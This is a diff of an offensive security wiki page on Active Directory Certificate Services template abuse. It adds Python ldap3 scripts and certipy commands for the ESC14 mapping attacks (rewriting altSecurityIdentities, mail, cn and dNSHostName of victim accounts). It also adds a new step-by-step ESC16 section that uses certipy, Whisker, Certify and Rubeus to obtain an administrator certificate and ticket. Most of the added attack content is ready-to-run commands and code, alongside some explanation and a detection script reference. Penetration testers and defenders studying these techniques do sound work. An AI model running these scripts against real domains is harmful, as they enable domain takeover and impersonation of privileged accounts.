@@ -26,13 +26,13 @@ Understanding certificate mapping is pretty useful to understand [ESC9](certific
 
 Mapping can be implicit or explicit, and strong or weak. These two notions work together, and the mapping of a certificate will use one option of each part (implicit and strong, or explicit and strong, and so on).
 
-**Implicit certificate mapping**
+#### **Implicit certificate mapping**
 
 With implicit mapping, the information contained in the certificate's SAN (_Subject Alternative Name_) is used to match the UPN attribute (`userPrincipalName`) for a user or the DNS attribute (`dNSHostName`) for a machine account. In the case of a user account, the `otherName` component of the SAN is used, and for a machine account it is `dNSName`.
 
 If the UPN mapping fails, the DC will attempt to match the username contained in `otherName` with the `sAMAccountName` attribute, and then with `sAMAccountName` suffixed with a `$`. Similarly, if DNS mapping fails, the DC will attempt to match the hostname contained in `dNSName` suffixed with a `$` with the `sAMAccountName`.
 
-**Explicit certificate mapping**
+#### **Explicit certificate mapping**
 
 For an explicit match, the `altSecurityIdentities` attribute of an account (user or machine) must contain the identifiers of the certificates with which it is authorised to authenticate. The certificate must be signed by a trusted certification authority and match one of the values in the `altSecurityIdentities` attribute.
 
@@ -44,7 +44,7 @@ These identifiers can be found in the various fields of an X509 v3 certificate.
 
 In AD CS, the certificate template specifies how the CA should populate the `Subject` field and the SAN extension of the certificate based on the enrollee's AD attributes.
 
-**Certificate attributes**
+#### **Certificate attributes**
 
 Before explaining weak and strong labels, it is important to talk about certificate attributs. The options in the "Subject Name" tab of the Windows Certificate Template Console correspond to the flags in the `msPKI-Certificate-Name-Flag` attribute of the certificate template. Flags whose names follow the pattern `CT_FLAG_SUBJECT_REQUIRE_<attribute>` relate to the information contained in the `Subject` field of the certificate, and `CT_FLAG_SUBJECT_ALT_REQUIRE_<attribute>` relates to the SAN extension.
 
@@ -59,7 +59,7 @@ Some flags prevent default users/computers from enrolling in a given certificate
 * `userPrincipalName`: the UPN attribute is not set by default for computers, but it is for users
 * `cn` : all AD objects have a `cn` attribute set by default
 
-**Weak and strong mapping**
+#### **Weak and strong mapping**
 
 As explained before, _weak_ and _strong_ "labels" are applied to certificate mapping and will influence on the final behavior of explicit and implicit mappings during Kebreros and Schannel authentications.
 
@@ -113,7 +113,7 @@ The current default value is `0x18` (`0x8` and `0x10`). Schannel doesn't support
 
 If some certificate authentication issues are encountered in an Active Directory, [Microsoft has officially suggested](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16) to set the `CertificateMappingMethods` value to `0x1f` (old value).
 
-**Issuance policies**
+#### **Issuance policies**
 
 It is possible to apply issuance policies to certificate templates. This takes the form of a certificate extension, and is stored as an OID (object identifier) in the `msPKI-Certificate-Policy` attribute of the template. When the CA issues the certificate, the policy is added to the "Certificate Policies" attribute of the certificate. A template stores required policies in the `msPKI-RA-Policies` attribute.
 
@@ -153,6 +153,10 @@ The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-th
 
 {% hint style="info" %}
 By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
+{% endhint %}
+
+{% hint style="info" %}
+If you get an "Object SID mismatch" error during the authentication, this could mean that Kerberos is enforcing [strong certificate mapping](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#weak-and-strong-mapping). This is the default behavior since february 2025 ([more information](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16#bkmk_certmap)). It is then possible to specify the security identifier (using the certipy's flag `-sid`) corresponding at the specified `subjectAltName`.
 {% endhint %}
 {% endtab %}
 
@@ -344,10 +348,11 @@ To understand this privilege escalation, it is recommended to know how certifica
 
 This ESC refers to a weak configuration of the registry keys:
 
-* Case 1 :
-  * `StrongCertificateBindingEnforcement` set to `0`, meaning no strong mapping is performed
-  * A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
-  * `GenericWrite` right against any account A to compromise any account B
+#### Case 1 :
+
+* `StrongCertificateBindingEnforcement` set to `0`, meaning no strong mapping is performed
+* A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
+* `GenericWrite` right against any account A to compromise any account B
 
 {% hint style="warning" %}
 At the time of writting (06/08/2022), there is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` value. It is worth to try the attack hopping the key is misconfigured.
@@ -439,10 +444,11 @@ Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"C
 {% endtab %}
 {% endtabs %}
 
-* Case 2 :
-  * `CertificateMappingMethods` is set to `0x4`, meaning no strong mapping is performed and only the UPN will be checked
-  * A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
-  * `GenericWrite` right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example)
+#### Case 2 :
+
+* `CertificateMappingMethods` is set to `0x4`, meaning no strong mapping is performed and only the UPN will be checked
+* A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
+* `GenericWrite` right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example)
 
 {% hint style="warning" %}
 At the time of writting (06/08/2022), there is no solution as a low privileged user to read the `CertificateMappingMethods` value. It is worth to try the attack hopping the key is misconfigured.
@@ -621,12 +627,6 @@ dacledit.py -action 'read' -principal 'controlled_object' -target 'target_object
 ```
 
 It is also possible to view the necessary DACL in BloodHound.
-
-Detection of weak explicit mapping can be done with the [Get-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Get-AltSecIDMapping.ps1) script (PowerShell) from a Windows machine. At the time of writing (May 16st, 2024), there is no solution to perform this check from a UNIX-like system.
-
-```bash
-Get-AltSecIDMapping -SearchBase "CN=Users,DC=domain,DC=local"
-```
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -641,10 +641,22 @@ Get-ADObject -Filter * -SearchBase "dc=domain,dc=local" | Get-WriteAltSecIDACEs
 ```
 
 It is also possible to view the necessary DACL in BloodHound.
+{% endtab %}
+{% endtabs %}
 
-Detection of weak explicit mapping can be done with the [Get-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Get-AltSecIDMapping.ps1) script (PowerShell) from a Windows machine. At the time of writing (May 16st, 2024), there is no solution to perform this check from a UNIX-like system.
+Detection of weak explicit mapping can be done like this :
 
-powershell
+{% tabs %}
+{% tab title="UNIX-Like" %}
+From UNIX-like systems, with the [GetWeakExplicitMappings.py](https://github.com/3C4D/GetWeakExplicitMappings/blob/main/GetWeakExplicitMappings.py) script (Python).
+
+```bash
+python3 GetWeakExplicitMappings.py -dc-host $DC_HOST -u $USERNAME -p $PASSWORD -domain $DOMAIN
+```
+{% endtab %}
+
+{% tab title="Windows" %}
+From a Windows machine, with the [Get-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Get-AltSecIDMapping.ps1) script (PowerShell).
 
 ```powershell
 Get-AltSecIDMapping -SearchBase "CN=Users,DC=domain,DC=local"
@@ -671,7 +683,86 @@ For PKINIT authentication, no additional requirements are necessary. For Schanne
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-// TODO
+From UNIX-like systems, with [certipy](https://github.com/ly4k/Certipy), it is possible to enroll on a certificate template.
+
+```bash
+certipy req -u $TARGET@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+```
+
+Then, using [certipy](https://github.com/ly4k/Certipy), we can get the certificate out of the pfx file.
+
+```bash
+certipy cert -pfx target.pfx -nokey -out "target.crt"
+```
+
+[openssl](https://github.com/openssl/openssl) can be used to extract the "Issuer" and the "Serial Number" value out of the certificate.
+
+```bash
+openssl x509 -in target.crt -noout -text
+```
+
+With the following python script (inspired from [this script](https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1)), we can use the previously dumped values to craft a X509IssuerSerialNumber mapping string.
+
+```bash
+issuer = ",".join("<ISSUER_DN>".split(",")[::-1])
+serial = "".join("<SERIAL_NUMBER>".split(":")[::-1])
+
+print("X509:<I>"+issuer+"<SR>"+serial)
+```
+
+the string can then be added to `altSecurityIdentities` target's attribute with the following python script.
+
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "<TARGET_DN>"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify(
+    victim_dn,
+    {'altSecurityIdentities':[(ldap3.MODIFY_ADD, '<X509IssuerSerialNumber>')]}
+)
+
+conn.unbind()
+```
+
+The certificate requested at the begining can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+
+The certificate mapping written can be cleaned with the following python script.
+
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "<TARGET_DN>"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify(
+    victim_dn,
+    {'altSecurityIdentities':[(ldap3.MODIFY_DELETE, '<X509IssuerSerialNumber>')]}
+)
+
+conn.unbind()
+```
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -728,7 +819,39 @@ For this attack, a few additional prerequisites are necessary:
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-// TODO
+From UNIX-like systems, the `mail` attribute of the victim can be overwritten to match the `X509RFC822` mapping of the target using the following python script.
+
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "<VICTIM_DN>"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify(
+    victim_dn,
+    {'mail':[(ldap3.MODIFY_REPLACE, '<TARGET_EMAIL>')]}
+)
+
+conn.unbind()
+```
+
+With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll on a certificate template using the victim credentials.
+
+```bash
+certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -774,7 +897,39 @@ In this example, the target has the explicit mapping value `X509:<I>DC=local,DC=
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-// TODO
+From UNIX-like systems, the `cn` attribute of the victim can be overwritten with the following python script to be equal to `<TARGET>.<DOMAIN>`.
+
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "CN=<VICTIM>,CN=Computers,DC=domain,DC=local"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify_dn(
+        victim_dn,
+        'CN=<TARGET>.<DOMAIN>'
+)
+
+conn.unbind()
+```
+
+With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll on a certificate template using the victim credentials
+
+```bash
+certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -819,7 +974,39 @@ In this example, the target has the explicit mapping value `X509:<S>CN=TARGET`. 
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-//TO DO
+From UNIX-like systems, the `dNSHostName` attribute of the victim can be overwritten with the following python script to be equal to `<TARGET>`.
+
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "CN=<VICTIM>,CN=Computers,DC=domain,DC=local"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify(
+    victim_dn,
+    {'dNSHostName':[(ldap3.MODIFY_REPLACE, '<TARGET>')]}
+)
+
+conn.unbind()
+```
+
+With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll on a certificate template using the victim credentials
+
+```bash
+certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -878,7 +1065,167 @@ _At the time of writing, no solution exists to perform this attack from a Window
 {% endtab %}
 {% endtabs %}
 
+### Security Extension Disabled on CA (ESC16) <a href="#esc16-security-extension-disabled-on-ca" id="esc16-security-extension-disabled-on-ca"></a>
+
+The ESC16 vulnerability occurs when a Certification Authority (CA) is configured to disable the inclusion of the OID `1.3.6.1.4.1.311.25.2` (the security extension) in all certificates it issues, or if the `KB5014754` patch has not been applied. This flaw causes the CA to behave as if all its published templates are vulnerable to the ESC9 vector.
+
+There are two possible attack scenarios for exploiting ESC16. In all cases, **one** of the following prerequisites must be met:
+
+{% hint style="warning" %}
+* `szOID_NTDS_CA_SECURITY_EXT` (`OID 1.3.6.1.4.1.311.25.2`) included into the `policy\DisableExtensionList` of the CA.
+* The `KB5014754` May 2022 patch isn't applied, which implies that `szOID_NTDS_CA_SECURITY_EXT` cannot be issued by the CA.
+{% endhint %}
+
+#### **Compatibility mode (ESC16 A)**&#x20;
+
+In this scenario, the attacker has `GenericWrite` permission over a victim account, which can be used to overwrite the victim's UPN. Using the victim's NT hash obtained via a [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials.md#shadow-credentials) attack, it's possible to request a certificate from the CA on the victim's behalf. Thanks to the UPN manipulation, a valid certificate can be obtained for any user in the domain.
+
+To conduct this scenario, the following additional prerequisites must be met:
+
+{% hint style="warning" %}
+* For PKINIT, `StrongCertificateBindingEnforcement` is set to `0` or `1`. This will cause the KDC to check only the UPN of the SAN included in the certificate request
+* The attacker user needs to have a `GenericWrite` or equivalent permission over the victim user
+{% endhint %}
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+**Step 1: Read the UPN of the victim**
+
+```bash
+certipy account \
+    -u "$USER@$DOMAIN" -p "$PASSWORD" \
+    -dc-ip "$DC_IP" -user 'victim' \
+    read
+```
+
+**Step 2: Update the victim account's UPN to the target administrator's `samAccountName`**
+
+```bash
+certipy account \
+    -u "$USER@$DOMAIN" -p "$PASSWORD" \
+    -dc-ip "$DC_IP" -upn 'administrator' \
+    -user 'victim' update
+```
+
+**(If needed) Retrieve the credentials for the victim (NT Hash)**
+
+```bash
+certipy shadow \
+    -u "$USER@$DOMAIN" -p "$PASSWORD" \
+    -dc-ip "$DC_IP" -account 'victim' \
+    auto
+```
+
+**Step 3: Request the certificate as the victim user from a suitable authentication template (e.g., "User")**
+
+```bash
+certipy req \
+    -u "victim@$DOMAIN" -hashes "$NT_HASH" \
+    -ca DOMAIN-DC-CA -template User \
+    -upn "administrator@$DOMAIN" -dc-ip "$DC_IP"
+```
+
+**Step 4: Revert the victim account's UPN**
+
+```bash
+certipy account \
+    -u "$USER@$DOMAIN" -p "$PASSWORD" \
+    -dc-ip "$DC_IP" -upn 'victim@$DOMAIN' \
+    -user 'victim' update
+```
+
+**Step 5: Authenticate as the target account**
+
+```bash
+certipy auth \
+    -dc-ip "$DC_IP" -pfx 'administrator.pfx' \
+    -username 'administrator' -domain "$DOMAIN"
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+{% endtab %}
+
+{% tab title="Windows" %}
+**Step 1: Update the victim account's UPN to the target administrator's**
+
+```powershell
+Set-DomainObject victim -Set @{'userPrincipalName'='administrator'} -Verbose
+```
+
+**(Possibly) Retrieve the credential for the victim (NT Hash)**
+
+```powershell
+Whisker.exe add /target:"victim" /domain:"DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+```
+
+**Step 2: Request the certificate as the victim user from a suitable authentication template**
+
+```powershell
+Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
+```
+
+**Step 3: Revert the victim account's UPN**
+
+```powershell
+Set-DomainObject victim -Set @{'userPrincipalName'='victim@corp.local'} -Verbose
+```
+
+**Step 4: Authenticate as the target account**
+
+```powershell
+Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+{% endtab %}
+{% endtabs %}
+
+#### **Full enforcement (ESC16 B)**&#x20;
+
+In this scenario, the DC's `StrongCertificateBindingEnforcement` attribute is set to `2`, meaning the KDC will verify the SID present in the certificate's security extension. If the CA is vulnerable to ESC6, the SID can be manipulated directly in the SAN field of the certificate request, bypassing the enforcement policy.
+
+To conduct this scenario, the following additional prerequisites must be met:
+
+{% hint style="warning" %}
+* For PKINIT, `StrongCertificateBindingEnforcement` is set to `2`
+* CA vulnerable to [ESC6](https://www.thehacker.recipes/ad/movement/adcs/certificate-authority#esc6-editf_attributesubjectaltname2)
+{% endhint %}
+
+{% tabs %}
+{% tab title="UNix-like" %}
+
+
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) can be used to request a certificate with a specific UPN and SID. As the whole CA is vulnerable to ESC16, any certificate template can be used to enroll at, for example, the `User` template.
+
+```
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$TARGET" -ca "$CA" -template "User" -upn "administrator@$DOMAIN" -sid "$ADMIN_SID"
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+
+{% hint style="info" %}
+In the case where `StrongCertificateBindingEnforcement` is set to `0` or `1`, only the `UPN` must be modified in the `SAN`.
+{% endhint %}
+{% endtab %}
+
+{% tab title="Windows" %}
+From Windows, [Certify](https://github.com/GhostPack/Certify) can be used to request a certificate with a specific UPN and SID. As the whole CA is vulnerable to ESC16, any certificate template can be used to enroll at, for example, the `User` template.
+
+```powershell
+./Certify.exe request /ca:SERVER\CA /template:User /altname:administrator /url:tag:microsoft.com,2007-09-14:sid:<ADMINISTRATOR_SID>
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+
+{% hint style="info" %}
+In the case where `StrongCertificateBindingEnforcement` is set to `0` or `1`, only the `UPN` must be modified in the `SAN`.
+{% endhint %}
+{% endtab %}
+{% endtabs %}
+
 ## Resources
+
+{% embed url="https://www.thehacker.recipes/ad/movement/adcs/certificate-templates" %}
 
 {% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}
 
